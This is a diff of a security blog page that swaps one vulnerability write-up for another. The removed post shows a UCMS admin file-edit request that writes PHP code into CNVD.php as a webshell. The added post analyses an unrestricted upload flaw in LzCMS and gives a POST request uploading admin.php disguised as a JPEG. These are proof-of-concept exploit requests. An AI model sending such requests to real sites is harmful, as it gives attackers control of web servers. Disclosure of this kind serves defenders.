@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>&#39;UCMS v.1.4.0-7Command execution&#39; | LS-Loophole</title>
+  <title>&#39;LzCMS v1.1.5 File upload&#39; | LS-Loophole</title>
   <meta name="keywords" content="">
-  <meta name="description" content="&#39;UCMS v.1.4.0-7Command execution&#39; | LS-Loophole">
+  <meta name="description" content="&#39;LzCMS v1.1.5 File upload&#39; | LS-Loophole">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Zip uses win feature to decompress, bypass blacklist and uploadVulnerability Type :File upload Vulnerability Version :YouDianCMS V9.1 Recurring environment: Windows 10 PHP 5.4.5 Apache 2.4.23  Vulnera">
 <meta property="og:type" content="article">
@@ -277,9 +277,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-UCMS v.1.4.0-7Command execution" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-LzCMS v1.1.5 File upload" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">&#39;UCMS v.1.4.0-7Command execution&#39;</h1>
+        <h1 class="article-title">&#39;LzCMS v1.1.5 File upload&#39;</h1>
     
     <div class="article-meta">
         
@@ -289,7 +289,7 @@
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2020-09-22 20:55:13'>2020-09-22 20:52</time>
+            发布时间 : <time class="date" title='最后更新: 2021-01-10 00:04:40'>2021-01-09 23:55</time>
         
     </div>
     <div class="article-meta">
@@ -311,7 +311,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#UCMS-v-1-4-0-7Command-execution"><span class="toc-text">UCMS v.1.4.0-7Command execution</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Type"><span class="toc-text">Vulnerability Type :</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Version"><span class="toc-text">Vulnerability Version :</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Recurring-environment"><span class="toc-text">Recurring environment:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Description-AND-recurrence"><span class="toc-text">Vulnerability Description AND recurrence:</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#LzCMS-v1-1-5-File-upload"><span class="toc-text">LzCMS v1.1.5 File upload</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Type"><span class="toc-text">Vulnerability Type :</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Version"><span class="toc-text">Vulnerability Version :</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Recurring-environment"><span class="toc-text">Recurring environment:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Description-AND-recurrence"><span class="toc-text">Vulnerability Description AND recurrence:</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -327,43 +327,52 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="UCMS-v-1-4-0-7Command-execution"><a href="#UCMS-v-1-4-0-7Command-execution" class="headerlink" title="UCMS v.1.4.0-7Command execution"></a>UCMS v.1.4.0-7Command execution</h1><h2 id="Vulnerability-Type"><a href="#Vulnerability-Type" class="headerlink" title="Vulnerability Type :"></a>Vulnerability Type :</h2><p>Eval injection</p>
-<h2 id="Vulnerability-Version"><a href="#Vulnerability-Version" class="headerlink" title="Vulnerability Version :"></a>Vulnerability Version :</h2><p>1.4.0-7</p>
+        <h1 id="LzCMS-v1-1-5-File-upload"><a href="#LzCMS-v1-1-5-File-upload" class="headerlink" title="LzCMS v1.1.5 File upload"></a>LzCMS v1.1.5 File upload</h1><h2 id="Vulnerability-Type"><a href="#Vulnerability-Type" class="headerlink" title="Vulnerability Type :"></a>Vulnerability Type :</h2><p>File upload</p>
+<h2 id="Vulnerability-Version"><a href="#Vulnerability-Version" class="headerlink" title="Vulnerability Version :"></a>Vulnerability Version :</h2><p>1.1.5</p>
 <h2 id="Recurring-environment"><a href="#Recurring-environment" class="headerlink" title="Recurring environment:"></a>Recurring environment:</h2><ul>
 <li>Windows 10</li>
 <li>PHP 5.4.5</li>
 <li>Apache 2.4.23</li>
 </ul>
-<h2 id="Vulnerability-Description-AND-recurrence"><a href="#Vulnerability-Description-AND-recurrence" class="headerlink" title="Vulnerability Description AND recurrence:"></a>Vulnerability Description AND recurrence:</h2><p>1、The current version is V1.4.5<br><img src="/imgss/40.png"></p>
-<p>2、Using the keyword search, I found the fopen() function in the<br>\UCMS\sadmin\fileedit.php file, where there are no restrictions on the filename suffix and content to write! So the PHP suffix can be written here to cause malicious command execution!</p>
-<p><img src="/imgss/41.png"></p>
-<p>3、Here I backtrace, first $_POST[&amp;apos;co&amp;apos;] exists, then $_GET[&amp;apos;file&amp;apos;]) exists, and $_GET[&amp;apos;dir&amp;apos;] exists. Most of all! In the first line of the file, we determine if there is a global variable admin. In this case, we can&amp;apos;t do anything without authorization, we just have to look up where is the entry</p>
-<p><img src="/imgss/42.png"></p>
-<p>4、The current file is under/UCMS/UCMS. This is the background file. And all the data can be found through the background operation route/UCMS /index.php hole. Go to /UCMS/index.php here</p>
-<p><img src="/imgss/43.png"></p>
-<p>5、And you can actually see that right here, it&amp;apos;s included by requiring something here. For analysis here, GET type parameters do and NOHTML need to be passed. And split $_GET[&amp;apos;do&amp;apos;] with &amp;apos;_&amp;apos; as the divider. The first part is included as the name of the folder, and the second part is included as the file name +&amp;apos;.php&amp;apos;.</p>
-<p>6、So the idea here is pretty clear, the vulnerability file is fileedit.php and it&amp;apos;s under sadmin, so $_GET[&amp;apos;do&amp;apos;] is sadmin_fileEdit. This satisfies the criteria to enter the fileEdit file, at which point you only need to satisfy the criteria in Fileedit.php. Here the POST package is<br>as follows:</p>
-<pre><code>POST /ucms/?do=sadmin_fileedit&amp;amp;dir=/&amp;amp;file=CNVD.php&amp;amp;pos=15 HTTP/1.1
-Host: www.ucm1.5.0.com
-User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:68.0) Gecko/20100101 
-Firefox/68.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+<h2 id="Vulnerability-Description-AND-recurrence"><a href="#Vulnerability-Description-AND-recurrence" class="headerlink" title="Vulnerability Description AND recurrence:"></a>Vulnerability Description AND recurrence:</h2><p><strong>Vulnerability hazard</strong></p>
+<p>Lzcms is a blog system developed by ThinkPHP + layui.</p>
+<p>Lzcms has a file upload vulnerability, which can be used by attackers to gain control of the website server.</p>
+<p><strong>Vulnerability analysis</strong></p>
+<p>The cause of the vulnerability is www\thinkphp\library\think\File.php File upload function point does not filter malicious suffixes</p>
+<pre><code>if (!strpos($savename, &#39;.&#39;)) &#123;
+    $savename .= &#39;.&#39; . pathinfo($this-&gt;getInfo(&#39;name&#39;), PATHINFO_EXTENSION);
+&#125;</code></pre>
+<p>Here we splice $savename, where $savename is the saved path. You can see from the code that this value is passed in<br><img src="/imgss/49.png"></p>
+<p>Here, this function is passed in by the above move function!<br><img src="/imgss/50.png"></p>
+<p>This CMS is a classic MVC structure, File.php It is a function. So there will be other controllers calling it</p>
+<p>You can see the calling code in the controller<br><img src="/imgss/51.png"></p>
+<p>Then the name of the path is clear</p>
+<pre><code>runtime/cache/</code></pre>
+<p>So what is the file name? Go back to <a target="_blank" rel="noopener" href="http://www.thinkphp.library.think/File.php">www.thinkphp.library.think\File.php</a> At 350, you can see that the file is MD5 current timestamp.</p>
+<p><img src="/imgss/52.png"></p>
+<p>The suffix is determined by the getinfo() function on line 367<br><img src="/imgss/53.png"><br>Getlnfo() function directly returns the suffix of the uploaded file!<br><img src="/imgss/54.png"></p>
+<p>So here caused any file upload, upload back to the path!<br><img src="/imgss/55.png"></p>
+<pre><code>POST /admin/upload/upimage.html HTTP/1.1
+Host: www.lzcms.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate
-Referer: 
-http://www.ucm1.5.0.com/ucms/?do=sadmin_fileedit&amp;amp;dir=/&amp;amp;file=123.php&amp;amp;pos=15
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 58
+Content-Type: multipart/form-data; boundary=---------------------------16202711904673375821319821163
+Content-Length: 18616
+Origin: http://www.lzcms.com
 Connection: close
-Cookie: admin_a83bb0=admin; psw_a83bb0=6609024d5fb57f730314b384acb138e4; 
-token_a83bb0=a81beeab
+Referer: http://www.lzcms.com/admin/article/edit/id/13.html
+Cookie: PHPSESSID=hrghtdh1rjg6rk37lng92ff3n7; sid=
 Upgrade-Insecure-Requests: 1
 
-uuu_token=a81beeab&amp;amp;co=&amp;lt;?php phpinfo()?&amp;gt;&amp;amp;pos=17
-</code></pre>
-<p><img src="/imgss/44.png"></p>
-<p>7、Here our Webshell phpInfo is in CNVD.php in the root directory</p>
-<p><img src="/imgss/45.png"></p>
+
+16202711904673375821319821163
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;admin.php&quot;
+Content-Type: image/jpeg
+
+Picture horse</code></pre>
+<p><img src="/imgss/56.png"></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至lingyu195@gmail.com </span>
